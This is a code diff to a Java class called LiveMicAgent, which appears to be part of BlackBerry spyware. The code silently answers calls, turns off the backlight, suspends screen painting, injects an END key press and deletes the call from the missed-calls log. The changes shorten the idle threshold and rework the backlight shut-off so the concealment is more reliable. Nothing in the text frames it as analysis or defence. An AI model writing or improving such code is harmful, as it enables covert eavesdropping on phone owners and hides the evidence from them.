@@ -57,7 +57,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
     //#ifdef DEBUG
     private static final long MINIMUM_IDLE_TIME = 5;
     //#else
-    private static final long MINIMUM_IDLE_TIME = 60;
+    private static final long MINIMUM_IDLE_TIME = 20;
     //#endif
 
     //#ifdef DEBUG
@@ -195,7 +195,9 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
      */
     public synchronized void onCallAnswered(final int callId,
             final String phoneNumber) {
+        //#ifdef DEBUG
         debug.init();
+        //#endif
 
         //#ifdef DBC
         Check.requires(phoneNumber != null, "onCallIncoming: phoneNumber null");
@@ -242,8 +244,8 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             return;
         }
 
-        suspendPainting(false);
-        Backlight.enable(false);
+        //suspendPainting(false);
+        //Backlight.enable(false);
         suspendPainting(true);
 
         //Utils.sleep(2000);
@@ -298,7 +300,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
                 removePhoneCallFromFolder(PhoneLogs.FOLDER_MISSED_CALLS);
             }
         });
-        
+
     }
 
     protected void removePhoneCallFromFolder(long folderID) {
@@ -378,7 +380,6 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             KeyInjector.pressKey(Keypad.KEY_END);
         }
 
-        Backlight.enable(false);
         suspendPainting(true);
     }
 
@@ -429,9 +430,17 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         //#endif              
 
         synchronized (Application.getEventLock()) {
+
+            if (suspend) {
+                Backlight.enable(false);
+                Utils.sleep(1000);
+            }
+
             boolean suspended = UiApplication.getUiApplication()
                     .isPaintingSuspended();
             if (suspended != suspend) {
+                
+
                 try {
                     //#ifdef LIVE_MIC_ENABLED
                     UiApplication.getUiApplication().suspendPainting(suspend);
@@ -441,6 +450,7 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
                     debug.error(ex);
                     //#endif
                 }
+
                 //suspended = suspend;
             }
         }
